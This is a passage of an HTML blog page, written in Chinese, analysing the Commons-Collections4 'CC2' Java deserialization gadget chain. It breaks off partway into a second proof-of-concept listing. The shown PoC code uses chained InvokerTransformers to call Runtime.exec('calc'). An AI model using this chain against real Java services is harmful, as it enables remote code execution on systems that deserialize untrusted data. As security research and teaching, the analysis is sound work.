@@ -1,0 +1,595 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>CC2分析与利用 - Gaorenyusi&#39;s Blog</title><meta name="Description" content="白茶清欢无别事，我在等风也等你"><meta property="og:url" content="http://localhost:1313/posts/cc2/">
+  <meta property="og:site_name" content="Gaorenyusi&#39;s Blog">
+  <meta property="og:title" content="CC2分析与利用">
+  <meta property="og:description" content="白茶清欢无别事，我在等风也等你">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-06-27T20:58:47+00:00">
+    <meta property="article:modified_time" content="2024-06-27T20:58:47+00:00">
+    <meta property="article:tag" content="Java">
+    <meta property="article:tag" content="反序列化">
+    <meta property="og:image" content="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/logo.webp">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/logo.webp">
+  <meta name="twitter:title" content="CC2分析与利用">
+  <meta name="twitter:description" content="白茶清欢无别事，我在等风也等你">
+<meta name="application-name" content="gaorenyusi">
+<meta name="apple-mobile-web-app-title" content="gaorenyusi"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/logo.webp"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/posts/cc2/" /><link rel="prev" href="http://localhost:1313/posts/cc3/" /><link rel="next" href="http://localhost:1313/posts/cc4-cc5/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "CC2分析与利用",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/posts\/cc2\/"
+        },"image": ["https:\/\/gaorenyusi.oss-cn-chengdu.aliyuncs.com\/img\/logo.webp"],"genre": "posts","keywords": "java, 反序列化","wordcount":  3439 ,
+        "url": "http:\/\/localhost:1313\/posts\/cc2\/","datePublished": "2024-06-27T20:58:47+00:00","dateModified": "2024-06-27T20:58:47+00:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "gaorenyusi","logo": "https:\/\/gaorenyusi.oss-cn-chengdu.aliyuncs.com\/img\/logo.webp"},"author": {
+                "@type": "Person",
+                "name": "gaorenyusi"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Gaorenyusi&#39;s Blog">Gaorenyusi&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/"> 主页 </a><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/links/" title="友链"> 友链 </a><a class="menu-item" href="/about/"> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Gaorenyusi&#39;s Blog">Gaorenyusi&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/" title="">主页</a><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/links/" title="友链">友链</a><a class="menu-item" href="/about/" title="">关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">CC2分析与利用</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>gaorenyusi</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/javasec/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Javasec</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-06-27">2024-06-27</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 3439 字&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 7 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#环境配置">环境配置</a></li>
+    <li><a href="#利用链1分析">利用链1分析</a>
+      <ul>
+        <li><a href="#readobject">readObject()</a></li>
+        <li><a href="#compare">compare()</a></li>
+        <li><a href="#poc编写">poc编写</a>
+          <ul>
+            <li><a href="#问题一heapify方法条件满足"><strong>问题一、heapify方法条件满足</strong></a></li>
+            <li><a href="#问题二解决add提前触发"><strong>问题二、解决add提前触发</strong></a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#利用链2分析">利用链2分析</a></li>
+    <li><a href="#参考">参考</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="cc2分析与利用">CC2分析与利用</h1>
+<h2 id="环境配置">环境配置</h2>
+<p><strong>一、</strong></p>
+<p>CC2 需要使用<code>commons-collections-4.0</code>版本，因为3.1-3.2.1版本中<code>TransformingComparator</code>没有实现<code>Serializable</code>接口，不能被序列化，所以CC2不用3.x版本。还需要 javassist 依赖，利用链2需要。</p>
+<p>pom.xml 添加：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&lt;groupId&gt;</span>org.apache.commons<span class="nt">&lt;/groupId&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>commons-collections4<span class="nt">&lt;/artifactId&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&lt;version&gt;</span>4.0<span class="nt">&lt;/version&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&lt;groupId&gt;</span>org.javassist<span class="nt">&lt;/groupId&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>javassist<span class="nt">&lt;/artifactId&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&lt;version&gt;</span>3.29.2-GA<span class="nt">&lt;/version&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/dependency&gt;</span></span></span></code></pre></div></div><p><strong>二、</strong></p>
+<ul>
+<li>
+<p>关于<code>commons-collections-4.0</code>：</p>
+<p><code>commons-collections-4.0</code>不再认为是一个用来替换<code>common-collection</code>的新版本，而是一个新的包。两者的命名空间不冲突，可以共存在同一个项目中。所以在common-collection4-4.0下，依旧能利用common-collection-3.1的调用链，只是换了个包名而已。</p>
+</li>
+<li>
+<p>关于Javassit：</p>
+<p>Javassist是一个开源的分析、编辑和创建Java字节码的类库，可以直接编辑和生成Java生成的字节码。能够在运行时定义新的Java类，在JVM加载类文件时修改类的定义。Javassist类库提供了两个层次的API，源代码层次和字节码层次。源代码层次的API能够以Java源代码的形式修改Java字节码。字节码层次的API能够直接编辑Java类文件</p>
+</li>
+</ul>
+<p><strong>三、</strong></p>
+<p>环境：</p>
+<p>jdk8u71</p>
+<p>commons-collections-4.0</p>
+<h2 id="利用链1分析">利用链1分析</h2>
+<p>在ysoserial中给了链子，起点类是<code>PriorityQueue.readObject()</code>。</p>
+<h3 id="readobject">readObject()</h3>
+<p>知道调用链就直接正向分析吧，先看它的readObject函数：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627170650.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627170650.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627170650.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627170650.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627170650.png"
+        title="QQ截图20240627170650" /></p>
+<p>调用了heapify函数，跟进：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627170743.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627170743.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627170743.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627170743.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627170743.png"
+        title="QQ截图20240627170743" /></p>
+<p>看到当<code>i&gt;=0</code>时进入<code>for</code>循环，<code>i=(size &gt;&gt;&gt; 1) -1</code>将size进行了右移操作。继续调用了<code>siftDown</code>方法。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627171007.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627171007.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627171007.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627171007.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627171007.png"
+        title="QQ截图20240627171007" /></p>
+<p>有个if条件，先不管，满足条件后调用了siftDownUsingComparator方法，跟进</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627171209.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627171209.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627171209.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627171209.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627171209.png"
+        title="QQ截图20240627171209" /></p>
+<p>看上面的利用链可以看到是利用了TransformingComparator类的compare方法（该类是<code>commons-collections-4.0</code>特有的）。这里我们需要用的是第二if中的compare方法，为什么不用第一个if中的呢？因为调试后面poc时就是走的第二个，猜测可能是不满足条件。</p>
+<p>comparator就是一个接口，而TransformingComparator实现了该接口，所以我们这里要让comparator为TransformingComparator对象，就可以调用TransformingComparator的compare方法了，跟进重写的该方法：</p>
+<h3 id="compare">compare()</h3>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627173036.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627173036.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627173036.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627173036.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627173036.png"
+        title="QQ截图20240627173036" /></p>
+<p>发现调用了transform方法，并且可以通过控制this.transformer来控制调用哪个对象的transform方法。</p>
+<p>可以调用任意对象的transform方法了，剩下的就不用多说了。</p>
+<p><strong>链子：</strong></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">PriorityQueue</span><span class="p">.</span><span class="na">readObject</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="n">PriorityQueue</span><span class="p">.</span><span class="na">heapify</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="n">PriorityQueue</span><span class="p">.</span><span class="na">siftDown</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="n">PriorityQueue</span><span class="p">.</span><span class="na">siftDownUsingComparator</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">				</span><span class="n">TransformingComparator</span><span class="p">.</span><span class="na">compare</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">					</span><span class="n">InvokerTransformer</span><span class="p">.</span><span class="na">transform</span><span class="p">()</span></span></span></code></pre></div></div><h3 id="poc编写">poc编写</h3>
+<p>先准备好<code>PriorityQueue</code>类和<code>TransformingComparator</code>类，<code>PriorityQueue</code>类构造函数：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627174619.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627174619.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627174619.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627174619.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627174619.png"
+        title="QQ截图20240627174619" /></p>
+<p>在看看<code>TransformingComparator</code>的构造函数</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627194841.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627194841.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627194841.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627194841.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627194841.png"
+        title="QQ截图20240627194841" /></p>
+<p>我们调用的是第一个，然后第一个会调用第二个构造函数，我们只用传入我们需要执行<code>transform</code>方法的对象这个参数就行了。</p>
+<p>所以先构造：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">org.example</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections4.Transformer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections4.functors.ChainedTransformer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections4.functors.ConstantTransformer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections4.functors.InvokerTransformer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections4.comparators.TransformingComparator</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.*</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.PriorityQueue</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">CC2</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="o">[]</span><span class="w"> </span><span class="n">transformers</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Transformer</span><span class="o">[]</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;getMethod&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;getRuntime&#34;</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">}),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;invoke&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">}),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;calc&#34;</span><span class="p">}),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">};</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ChainedTransformer</span><span class="w"> </span><span class="n">cha</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ChainedTransformer</span><span class="p">(</span><span class="n">transformers</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">PriorityQueue</span><span class="w">  </span><span class="n">queue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">PriorityQueue</span><span class="p">(</span><span class="n">1</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">TransformingComparator</span><span class="p">(</span><span class="n">cha</span><span class="p">));</span></span></span></code></pre></div></div><h4 id="问题一heapify方法条件满足"><strong>问题一、heapify方法条件满足</strong></h4>
+<p>执行后没有弹计算机，因为发现在执行<code>heapify</code>方法中，需要满足<code>(size &gt;&gt;&gt; 1) - 1 ≥ 0</code>，意思就是size&gt;2，这个可以通过add方法来向<code>PriorityQueue</code>对象中存放值，但是具体实现的还是offer函数：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627195131.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627195131.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627195131.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627195131.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20240627195131.png"
+        title="QQ截图20240627195131" /></p>
+<p>构造poc：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">org.example</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections4.Transformer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections4.functors.ChainedTransformer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections4.functors.ConstantTransformer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections4.functors.InvokerTransformer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections4.comparators.TransformingComparator</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.*</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.PriorityQueue</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">CC2</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
